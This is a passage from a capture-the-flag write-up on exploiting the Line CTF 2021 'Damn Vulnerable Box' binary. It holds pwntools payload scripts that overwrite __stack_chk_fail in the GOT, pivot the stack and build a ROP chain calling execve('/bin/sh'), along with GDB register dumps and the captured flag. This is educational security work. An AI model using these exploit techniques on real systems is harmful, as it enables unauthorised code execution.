$r10   : 0x00007ffff7b403c0  →  0x0002000200020002
$r11   : 0x246             
$r12   : 0x00007fffffffdda0  →  0x0000000000000004
$r13   : 0x0               
$r14   : 0x000010007fff7b0c  →  0x00000000f1f1f1f1  →  0x0000000000000000
$r15   : 0x00000ffffffffbb4  →  0x0000000000000000
$eflags: [zero CARRY parity ADJUST SIGN trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000 
─────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
     0x4c7e6d &lt;main+765&gt;       movups XMMWORD PTR [r14+0x4], xmm0
     0x4c7e72 &lt;main+770&gt;       mov    rdi, QWORD PTR [rbx+0x18]
     0x4c7e76 &lt;main+774&gt;       mov    rsi, QWORD PTR [rbx+0x8]
 →   0x4c7e7a &lt;main+778&gt;       call   0x480970 &lt;strcpy&gt;
   ↳    0x480970 &lt;strcpy+0&gt;       push   rbp
        0x480971 &lt;strcpy+1&gt;       mov    rbp, rsp
        0x480974 &lt;strcpy+4&gt;       push   r15
        0x480976 &lt;strcpy+6&gt;       push   r14
        0x480978 &lt;strcpy+8&gt;       push   r13
        0x48097a &lt;strcpy+10&gt;      push   r12</code></pre></figure>

<p>Calling <code class="language-plaintext highlighter-rouge">strcpy</code> again and even better, we’re controlling <code class="language-plaintext highlighter-rouge">rdi</code> and <code class="language-plaintext highlighter-rouge">rsi</code>! We have an arbitrary write here :)</p>

<p>We can use this now to overwrite <code class="language-plaintext highlighter-rouge">__stack_chk_fail@got</code> to do something more useful. We just need the content, we want to copy over the got entry somewhere in memory at a known position.</p>

<p>Thankfully, there is the <code class="language-plaintext highlighter-rouge">Global Buffer-overflow</code>, which will just copy our input into <code class="language-plaintext highlighter-rouge">global_buf</code> on <code class="language-plaintext highlighter-rouge">bss</code>.</p>

<p>So we can put the gadget, we want to be executed, into the global buffer and then use the <code class="language-plaintext highlighter-rouge">strcpy</code> to copy it into <code class="language-plaintext highlighter-rouge">__stack_chk_fail@got</code>.</p>

<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Put gadget into global buffer"</span><span class="p">)</span>

<span class="n">globuf</span><span class="p">(</span><span class="n">p64</span><span class="p">(</span><span class="mh">0xdeadbeef</span><span class="p">))</span>

<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Trigger stack overflow"</span><span class="p">)</span>

<span class="n">payload</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x48</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">cyclic_metasploit</span><span class="p">(</span><span class="mi">1144</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x4</span><span class="p">)</span>                           <span class="c1"># menu choice
</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">cyclic_metasploit</span><span class="p">(</span><span class="mi">32</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">e</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">"global_buf"</span><span class="p">])</span>       <span class="c1"># strcpy rsi
</span><span class="n">payload</span> <span class="o">+=</span> <span class="s">"A"</span><span class="o">*</span><span class="mi">8</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">e</span><span class="p">.</span><span class="n">got</span><span class="p">[</span><span class="s">"__stack_chk_fail"</span><span class="p">])</span>     <span class="c1"># strcpy rdi	
</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x4fb5c0</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xe24aa0</span><span class="o">-</span><span class="mh">0x7f8</span><span class="p">)</span>                <span class="c1"># _Z12pagefilenameB5cxx11
</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">cyclic_metasploit</span><span class="p">(</span><span class="mi">3000</span><span class="o">-</span><span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">))</span></code></pre></figure>

<figure class="highlight"><pre><code class="language-text" data-lang="text">gef➤  x/gx 0x00000000004fb058
0x4fb058 &lt;__stack_chk_fail@got.plt&gt;:	0x00000000deadbeef</code></pre></figure>

<p>We have successfully overwritten <code class="language-plaintext highlighter-rouge">__stack_chk_fail@got</code> now, but we run into the next segfault.</p>

<figure class="highlight"><pre><code class="language-text" data-lang="text">Program received signal SIGSEGV, Segmentation fault.
0x00000000004c7d36 in main ()
───────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x6141316141306141 ("Aa0Aa1Aa"?)
$rbx   : 0x00007fffffffddc0  →  0x6241396141386141 ("Aa8Aa9Ab"?)
$rcx   : 0x0               
$rdx   : 0x00007ffff6940a00  →  0x00007ffff6940a00  →  [loop detected]
$rsp   : 0x00007fffffffd860  →  0x0000000041b58ab3
$rbp   : 0x00007fffffffde60  →  "d7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3[...]"
$rsi   : 0x0               
$rdi   : 0x00007fffffffb5d0  →  0x00007ffff7bd7b50  →  &lt;funlockfile+0&gt; endbr64 
$rip   : 0x00000000004c7d36  →  &lt;main+454&gt; cmp BYTE PTR [rax+0x7fff8000], 0x0
$r8    : 0x3               
$r9    : 0x0               
$r10   : 0x00007ffff7b403c0  →  0x0002000200020002
$r11   : 0x246             
$r12   : 0x00007fffffffdda0  →  0x0000000000000004
$r13   : 0x1               
$r14   : 0x000010007fff7b0c  →  0xf8f8f8f8f1f1f1f1
$r15   : 0x00000ffffffffbb4  →  0x0000000000000000
$eflags: [zero carry parity adjust sign trap INTERRUPT direction overflow RESUME virtualx86 identification]
$cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000 
─────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
     0x4c7d2b &lt;main+443&gt;       xor    eax, eax
     0x4c7d2d &lt;main+445&gt;       call   0x43bf70 &lt;printf&gt;
     0x4c7d32 &lt;main+450&gt;       mov    rax, QWORD PTR [rbx+0x30]
 →   0x4c7d36 &lt;main+454&gt;       cmp    BYTE PTR [rax+0x7fff8000], 0x0
     0x4c7d3d &lt;main+461&gt;       jne    0x4c7fe2 &lt;main+1138&gt;
     0x4c7d43 &lt;main+467&gt;       mov    rdi, QWORD PTR [rip+0x36ab6]        # 0x4fe800 &lt;stdout@@GLIBC_2.2.5&gt;
     0x4c7d4a &lt;main+474&gt;       call   0x46bdc0 &lt;fflush&gt;
     0x4c7d4f &lt;main+479&gt;       movzx  eax, BYTE PTR [r15+0x7fff8000]
     0x4c7d57 &lt;main+487&gt;       test   al, al</code></pre></figure>

<p>Nothing, a valid pointer couldn’t fix ;-)</p>

<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="n">payload</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x48</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">cyclic_metasploit</span><span class="p">(</span><span class="mi">1144</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x4</span><span class="p">)</span>                         <span class="c1"># menu choice
</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">cyclic_metasploit</span><span class="p">(</span><span class="mi">32</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">e</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">"global_buf"</span><span class="p">])</span>     <span class="c1"># strcpy rsi
</span><span class="n">payload</span> <span class="o">+=</span> <span class="s">"A"</span><span class="o">*</span><span class="mi">8</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">e</span><span class="p">.</span><span class="n">got</span><span class="p">[</span><span class="s">"__stack_chk_fail"</span><span class="p">])</span>   <span class="c1"># strcpy rdi	
</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x4fb5c0</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xe24aa0</span><span class="o">-</span><span class="mh">0x7f8</span><span class="p">)</span>              <span class="c1"># _Z12pagefilenameB5cxx11
</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x80e1c9e0</span><span class="o">-</span><span class="mh">0x7fff8000</span><span class="p">)</span>       <span class="c1"># random address to pass check
</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">cyclic_metasploit</span><span class="p">(</span><span class="mi">3000</span><span class="o">-</span><span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">))</span></code></pre></figure>

<figure class="highlight"><pre><code class="language-text" data-lang="text">0x000000000041c0b0 in __stack_chk_fail@plt ()
───────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0xac3829215e90f400
$rbx   : 0x00007fffffffddc0  →  0x6241396141386141 ("Aa8Aa9Ab"?)
$rcx   : 0x0               
$rdx   : 0x80              
$rsp   : 0x00007fffffffd858  →  0x00000000004c803c  →   nop DWORD PTR [rax+0x0]
$rbp   : 0x00007fffffffde60  →  "4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0A[...]"
$rsi   : 0x560             
$rdi   : 0x1c4855          
$rip   : 0x000000000041c0b0  →  &lt;__stack_chk_fail@plt+0&gt; jmp QWORD PTR [rip+0xdefa2]        # 0x4fb058 &lt;__stack_chk_fail@got.plt&gt;
$r8    : 0x00007fffffffd6f0  →  0x0000000000000000
$r9    : 0x0               
$r10   : 0x00007ffff7b3fac0  →  0x0000000100000000  →  0x0000000000000000
$r11   : 0x00007ffff7b403c0  →  0x0002000200020002
$r12   : 0x00007fffffffdda0  →  0x0000000000000000
$r13   : 0x1               
$r14   : 0x000010007fff7b0c  →  0xf8f8f8f8f1f1f1f1
$r15   : 0x00000ffffffffbb4  →  0x0000000000000000
$eflags: [zero carry parity ADJUST sign trap INTERRUPT direction OVERFLOW resume virtualx86 identification]
$cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000 
─────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
     0x41c0a0 &lt;alarm@plt+0&gt;    jmp    QWORD PTR [rip+0xdefaa]        # 0x4fb050 &lt;alarm@got.plt&gt;
     0x41c0a6 &lt;alarm@plt+6&gt;    push   0x7
     0x41c0ab &lt;alarm@plt+11&gt;   jmp    0x41c020
 →   0x41c0b0 &lt;__stack_chk_fail@plt+0&gt; jmp    QWORD PTR [rip+0xdefa2]        # 0x4fb058 &lt;__stack_chk_fail@got.plt&gt;
     0x41c0b6 &lt;__stack_chk_fail@plt+6&gt; push   0x8
     0x41c0bb &lt;__stack_chk_fail@plt+11&gt; jmp    0x41c020
     0x41c0c0 &lt;getuid@plt+0&gt;   jmp    QWORD PTR [rip+0xdef9a]        # 0x4fb060 &lt;getuid@got.plt&gt;
     0x41c0c6 &lt;getuid@plt+6&gt;   push   0x9
     0x41c0cb &lt;getuid@plt+11&gt;  jmp    0x41c020
───────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007fffffffd858│+0x0000: 0x00000000004c803c  →   nop DWORD PTR [rax+0x0]	 ← $rsp
0x00007fffffffd860│+0x0008: 0x0000000041b58ab3
0x00007fffffffd868│+0x0010: 0x00000000004dd569  →  "3 32 128 11 local_buf.i 192 1024 3 buf 1344 4 1 m"
0x00007fffffffd870│+0x0018: 0x00000000004c7b70  →  &lt;main+0&gt; push rbp
0x00007fffffffd878│+0x0020: 0x00007ffff6b10e60  →  0x00007ffff7da8035  →  "GLIBC_2.2.5"
0x00007fffffffd880│+0x0028: 0x0000000000401f8c  →  0x23ea6d8c0d39ad3d
────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  x/gx 0x4fb058
0x4fb058 &lt;__stack_chk_fail@got.plt&gt;:	0x00000000deadbeef</code></pre></figure>

<p>We’re passing all tests, getting back into <code class="language-plaintext highlighter-rouge">__stack_chk_fail</code> and jumping to our target gadget (currently <code class="language-plaintext highlighter-rouge">0xdeadbeef</code>).</p>

<figure class="highlight"><pre><code class="language-text" data-lang="text">gef➤  x/10i 0x00000000004bf6ac
0x4bf6ac &lt;_ZN7__ubsan15InitializeFlagsEv+220&gt;:	add    rsp,0x100
0x4bf6b3 &lt;_ZN7__ubsan15InitializeFlagsEv+227&gt;:	pop    rbx
0x4bf6b4 &lt;_ZN7__ubsan15InitializeFlagsEv+228&gt;:	pop    r14
0x4bf6b6 &lt;_ZN7__ubsan15InitializeFlagsEv+230&gt;:	pop    r15
0x4bf6b8 &lt;_ZN7__ubsan15InitializeFlagsEv+232&gt;:	ret    </code></pre></figure>

<p>This would make a good stack pivoting gadget, which will jump right into <code class="language-plaintext highlighter-rouge">user_input</code>.</p>

<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Put gadget into global buffer"</span><span class="p">)</span>

<span class="n">ADDRSP110</span> <span class="o">=</span> <span class="mh">0x4bf6ac</span>

<span class="n">globuf</span><span class="p">(</span><span class="n">p64</span><span class="p">(</span><span class="n">ADDRSP110</span><span class="p">))</span>

<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Trigger stack overflow"</span><span class="p">)</span>

<span class="n">payload</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x48</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">cyclic_metasploit</span><span class="p">(</span><span class="mi">1144</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x4</span><span class="p">)</span>                                 <span class="c1"># menu choice
</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">cyclic_metasploit</span><span class="p">(</span><span class="mi">32</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">e</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">"global_buf"</span><span class="p">])</span>             <span class="c1"># strcpy rsi
</span><span class="n">payload</span> <span class="o">+=</span> <span class="s">"A"</span><span class="o">*</span><span class="mi">8</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">e</span><span class="p">.</span><span class="n">got</span><span class="p">[</span><span class="s">"__stack_chk_fail"</span><span class="p">])</span>           <span class="c1"># strcpy rdi	
</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x4fb5c0</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xe24aa0</span><span class="o">-</span><span class="mh">0x7f8</span><span class="p">)</span>                      <span class="c1"># _Z12pagefilenameB5cxx11
</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x80e1c9e0</span><span class="o">-</span><span class="mh">0x7fff8000</span><span class="p">)</span>               <span class="c1"># random address to pass check
</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">cyclic_metasploit</span><span class="p">(</span><span class="mi">3000</span><span class="o">-</span><span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">))</span>
		
<span class="n">stack</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span></code></pre></figure>

<figure class="highlight"><pre><code class="language-text" data-lang="text">Program received signal SIGSEGV, Segmentation fault.
0x00000000004bf6b8 in __ubsan::InitializeFlags() ()
───────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x27c089aae200bd00
$rbx   : 0x6241376241366241 ("Ab6Ab7Ab"?)
$rcx   : 0x0               
$rdx   : 0x80              
$rsp   : 0x00007fffffffd970  →  "Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae[...]"
$rbp   : 0x00007fffffffde60  →  "4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0A[...]"
$rsi   : 0x560             
$rdi   : 0x1c4855          
$rip   : 0x00000000004bf6b8  →  &lt;__ubsan::InitializeFlags()+232&gt; ret 
$r8    : 0x00007fffffffd6f0  →  0x0000000000000000
$r9    : 0x0               
$r10   : 0x00007ffff7b3fac0  →  0x0000000100000000  →  0x0000000000000000
$r11   : 0x00007ffff7b403c0  →  0x0002000200020002
$r12   : 0x00007fffffffdda0  →  0x0000000000000000
$r13   : 0x1               
$r14   : 0x4130634139624138 ("8Ab9Ac0A"?)
$r15   : 0x3363413263413163 ("c1Ac2Ac3"?)
$eflags: [zero carry parity adjust sign trap INTERRUPT direction overflow RESUME virtualx86 identification]
$cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000 
─────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
     0x4bf6b3 &lt;__ubsan::InitializeFlags()+227&gt; pop    rbx
     0x4bf6b4 &lt;__ubsan::InitializeFlags()+228&gt; pop    r14
     0x4bf6b6 &lt;__ubsan::InitializeFlags()+230&gt; pop    r15
 →   0x4bf6b8 &lt;__ubsan::InitializeFlags()+232&gt; ret    
[!] Cannot disassemble from $PC
───────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007fffffffd970│+0x0000: "Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae[...]"	 ← $rsp
0x00007fffffffd978│+0x0008: "6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2A[...]"
0x00007fffffffd980│+0x0010: "c9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5[...]"
0x00007fffffffd988│+0x0018: "Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae[...]"
0x00007fffffffd990│+0x0020: "4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0A[...]"
0x00007fffffffd998│+0x0028: "d7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3[...]"
────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  x/gx $rsp
0x7fffffffd970:	0x6341356341346341</code></pre></figure>

<p>Everything’s set up, all that’s left to do is a ropchain to read <code class="language-plaintext highlighter-rouge">/bin/sh</code> into <code class="language-plaintext highlighter-rouge">global_buf</code> and then <code class="language-plaintext highlighter-rouge">execve</code> it :)</p>

<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="n">ADDRSP110</span> <span class="o">=</span> <span class="mh">0x4bf6ac</span>

<span class="n">POPRAX</span> <span class="o">=</span> <span class="mh">0x000000000041ea66</span>
<span class="n">POPRDI</span> <span class="o">=</span> <span class="mh">0x000000000041c9ae</span>
<span class="n">POPRSI</span> <span class="o">=</span> <span class="mh">0x000000000041c5ec</span>
<span class="n">SYSCALL</span> <span class="o">=</span> <span class="mh">0x00000000004aaa45</span>
<span class="n">XOREDXPOPRCX</span> <span class="o">=</span> <span class="mh">0x00000000004c400d</span>
<span class="n">XOREDXSYSCALL</span> <span class="o">=</span> <span class="mh">0x00000000004ab5be</span>
	
<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Put gadget into global buffer"</span><span class="p">)</span>

<span class="n">globuf</span><span class="p">(</span><span class="n">p64</span><span class="p">(</span><span class="n">ADDRSP110</span><span class="p">))</span>

<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Trigger stack overflow"</span><span class="p">)</span>

<span class="n">payload</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x48</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">cyclic_metasploit</span><span class="p">(</span><span class="mi">72</span><span class="p">)</span>

<span class="c1"># read /bin/sh
</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">POPRAX</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">POPRDI</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">POPRSI</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">e</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">"global_buf"</span><span class="p">])</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">SYSCALL</span><span class="p">)</span>

<span class="c1"># execve /bin/sh
</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">POPRAX</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">59</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">POPRDI</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">e</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">"global_buf"</span><span class="p">])</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">POPRSI</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>	
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">XOREDXSYSCALL</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="s">"/bin/sh</span><span class="se">\x00</span><span class="s">"</span>
	
<span class="n">payload</span> <span class="o">+=</span> <span class="n">cyclic_metasploit</span><span class="p">(</span><span class="mi">1144</span><span class="o">+</span><span class="mi">8</span><span class="o">-</span><span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">))</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x4</span><span class="p">)</span>                             <span class="c1"># menu choice
</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">cyclic_metasploit</span><span class="p">(</span><span class="mi">32</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">e</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">"global_buf"</span><span class="p">])</span>         <span class="c1"># strcpy rsi
</span><span class="n">payload</span> <span class="o">+=</span> <span class="s">"A"</span><span class="o">*</span><span class="mi">8</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">e</span><span class="p">.</span><span class="n">got</span><span class="p">[</span><span class="s">"__stack_chk_fail"</span><span class="p">])</span>       <span class="c1"># strcpy rdi	
</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x4fb5c0</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xe24aa0</span><span class="o">-</span><span class="mh">0x7f8</span><span class="p">)</span>                  <span class="c1"># _Z12pagefilenameB5cxx11
</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x80e1c9e0</span><span class="o">-</span><span class="mh">0x7fff8000</span><span class="p">)</span>           <span class="c1"># random address to pass check
</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">cyclic_metasploit</span><span class="p">(</span><span class="mi">3000</span><span class="o">-</span><span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">))</span>
		
<span class="n">stack</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>

<span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"&gt; "</span><span class="p">)</span>
<span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"0"</span><span class="p">)</span>

<span class="n">r</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mf">0.5</span><span class="p">)</span>
<span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"/bin/sh</span><span class="se">\x00</span><span class="s">"</span><span class="p">)</span></code></pre></figure>

<figure class="highlight"><pre><code class="language-text" data-lang="text">[*] '/home/kileak/ctf/line/damn/box'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
    ASAN:     Enabled
    UBSAN:    Enabled
[+] Opening connection to 35.221.91.124 on port 10008: Done
[*] Put gadget into global buffer
[*] Trigger stack overflow
[*] Switching to interactive mode
$ cat flag
LINECTF{damn_y0u_4re_so_good}</code></pre></figure>


    <aside class="share">

      <span>Share this: </span>

      <a href="http://twitter.com/share?text=Line CTF - Damn Vulnerable Box&amp;url=https://kileak.github.io/ctf/2021/linectf-damn/"
      onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
        <i class="icon icon-twitter-rounded"></i>
      </a>

      <a href="https://www.facebook.com/sharer/sharer.php?u=https://kileak.github.io/ctf/2021/linectf-damn/"
      onclick="window.open(this.href, 'facebook-share','width=580,height=296');return false;">
        <i class="icon icon-facebook-rounded"></i>
      </a>

    </aside>
  </div>

  
  <hr>
  <aside id="comments" class="disqus">
    <div class="container">
      <h3><i class="icon icon-comments-o"></i> Comments</h3>
      <div id="disqus_thread"></div>

      <script type="text/javascript">
        var disqus_shortname = 'kileak';
        var disqus_identifier = '/ctf/2021/linectf-damn';
        var disqus_title = 'Line CTF - Damn Vulnerable Box';
        var disqus_url = 'https://kileak.github.io/ctf/2021/linectf-damn';

        (function() {
            var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
        })();
      </script>

      <noscript>
        Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" rel="nofollow">comments powered by Disqus.</a>
      </noscript>
    </div>
  </aside>



</article>

        </section>

        
<div class="clearfix"></div>

<footer class="site-footer txt-center">
  <hr>

  <ul class="social">
    
  </ul>

  <small>&copy; 2025 All rights reserved. Made with <a href="http://jekyllrb.com" target="_blank">Jekyll</a> and <i class="icon icon-heart"></i></small>
  <small>by <a href="http://nandomoreira.me" target="_blank">nandomoreira.me</a></small>

</footer>


    </main>

    <a href="http://github.com/Kileak" target="_blank" class="github-corner"><svg width="80" height="80" viewBox="0 0 250 250" style="fill:#000; color:#fff; position: absolute; top: 0; border: 0; right: 0;"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>

    <script src="/js/jquery.min.js"></script>
    <script src="/js/jekyll-search.min.js"></script>
    <script src="/js/main.js"></script>
  </body>
</html>
